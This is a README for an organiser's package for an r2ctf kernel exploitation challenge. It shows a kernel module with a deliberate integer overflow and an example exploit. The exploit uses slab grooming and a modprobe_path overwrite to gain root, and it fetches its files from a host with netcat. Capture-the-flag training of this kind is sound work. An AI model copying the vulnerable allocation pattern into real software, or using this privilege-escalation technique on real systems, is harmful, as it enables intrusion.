# Kernel exploitation challenge for r2ctf

## Package contents

This package contains the following things:

* The kernel module source is in `module/`.

* The files to provide to the participants can be found in `challenge_v1_pub/`

* The files to run in the production server can be found in `challenge_v1_prod/`. WARNING: These files contain the actual flag and should NOT be available to participants in any way except than through a TCP/IP connection to the challenge console.

* An example exploit is provided in `exploit/`.

## Challenge description

You can put something like this:

```
r2 has new socks, and they are in kernel land! Pwn the kernel in this challenge and read the flag off `/flag.txt`.
```

Or whatever you can think of :)


## Challenge setup

The challenge is provided as a VM image that boots into a limited shell.

The objective of the challenge is to root the image by exploiting a bug in the `/dev/socks` kernel module (or a Linux kernel bug for that matter).

Once rooted, the flag can be read off `/flag.txt`

## The bug

The kernel module contains an integer overflow during allocation:

```c
static long socks_ioctl_init(sock_t *sock, unsigned long arg) {
    uint64_t size = arg + sizeof(sock_buf_t);
    sock_buf_t *buf = NULL;
    int err = 0;

    // Sanity check without locking the buffer.
    if (size > MAX_SIZE) {
        return -EINVAL;
    }

    // First off: lock the buffer

    spin_lock(&sock->lock);

    if (sock->state != UNINITIALIZED) {
        err = -EINVAL;
        goto out_unlock;
    }

    buf = kzalloc(size, GFP_KERNEL);
    printk(KERN_ALERT "Allocated ptr %llx\n", buf);

    if (IS_ERR_OR_NULL(buf)) {
        err = (buf ? PTR_ERR(buf) : -ENOMEM);
        goto out_unlock;
    }

    sock->buf = buf;
    sock->buf->size = size - sizeof(sock_buf_t);
    sock->buf->write_index = 0;
    sock->buf->read_index = 0;
    sock->buf->buffer = (unsigned char *)buf + sizeof(sock_buf_t); // Buffer is inline

    sock->state = INITIALIZED;
```

Since the buffer data is inline with the `sock_buf_t` structure, the integer overflow means we can corrupt arbitrary data in the heap by sending data to the socket.

## Exploit

The exploit first creates a number of sockets of size 0x20 to exhaust the slab cache and make sure they are contiguous.

Then it makes the next two sockets, one of which is overflown, and connects them:

```c
	for(int i=0; i < 0x400 - 0x10; i++) {
		// Open a bunch of size 0 (alloc size should be 0x20)
		int fd = open("/dev/socks", O_RDONLY);
		sock_init(fd, 0x0);
	}
	/* Let's have two socks */

	int fd1 = open("/dev/socks", O_RDONLY);
	int fd2 = open("/dev/socks", O_RDONLY);
	

	sock_init(fd1, -1);
	sock_listen(fd1, "test_socket");
	sock_init(fd2, 0x00);
	sock_connect(fd2, "test_socket");
```

At this point, sending data through `fd2` will write to the buffer corresponding to `fd1`. Since they are consecutive in memory, this means we overlfow the `sock_buf_t` for `fd2`.

The exploit uses this to setup a `sock_buf_t` that points to `modprobe_path` and set that variable to `/home/user/pwn.sh`:

```c

	/* Send to fd1 => corrupt buffer size and pointer of fd2 */
	
	sock_buf_t buf;
	buf.size = 0x100;
	buf.buffer = 0xffffffff82023ae0L; // modprobe path
	buf.read_index = 0x00;
	buf.write_index = 0x00;
	sock_send(fd2, &buf, sizeof(buf));

	/* NOW THIS PERFORMS ARBITRARY WRITE */
	char pwn[] = "/home/user/pwn.sh";
	sock_send(fd1, pwn, sizeof(pwn));
```

Finally the exploit triggers the use of `modprobe_path` by trying to create an SCTP socket:

```
socket(AF_INET,SOCK_STREAM,132);
```

This makes the kernel run `/home/user/pwn.sh` as root.

## Example run

Since the Qemu image has networking enabled, we can test it by just using 
netcat to pull the exploit files from the host:

```
$ nc 10.0.2.2 1234 > pwn.sh
~ $ nc 10.0.2.2 1234 > exploit
~ $ chmod 700 *
~ $ ./exploit 
[*] Trying to listen in test_socket
[*] Trying to connect to test_socket
~ $ ls
exploit   flag.txt  pwn.sh
~ $ cat flag.txt 
r2con{06e6ec5e2653a51e6e383ee4776a6670}
```

## Running in production

To run in production, simply launch `run.sh` through e.g. a `xinetd` service.

See for example this:

https://github.com/OpenToAllCTF/OTA-University/tree/master/challenge_templates/pwn
